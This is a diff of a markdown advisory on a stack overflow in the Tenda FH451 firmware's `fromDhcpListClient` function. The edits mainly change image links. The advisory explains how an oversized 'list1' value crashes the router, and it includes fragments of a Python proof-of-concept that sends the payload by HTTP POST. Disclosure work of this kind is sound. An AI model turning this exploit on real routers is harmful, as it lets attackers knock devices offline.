@@ -6,7 +6,8 @@ FH451  V1.0.0.9
 ## Vulnerability details
 
 Tenda FH451 V1.0.0.9  has a stack overflow vulnerability in the `fromDhcpListClient` function. We can set `LISTEN=1` and the program will enter line 30 and 33, which leads to a stack overflow vulnerability. Since the overflow overrides the `LISTEN` pointer variable, the `atoi` function will crash the program, causing a DOS attack in the second time looping.
-![[2024-08-30 160030.png]]
+![Vulnerability Function2](160030.png)
+
 ## POC
 
 ```python
@@ -21,5 +22,5 @@ data = {"LISTLEN":1,"page":1,"list1": payload}
 response = requests.post(url, data=data)
 print(response.text)
 ```
-
-![[2024-08-30 155125.png]]
+![Vulnerability Function2](155125.png)
+]]
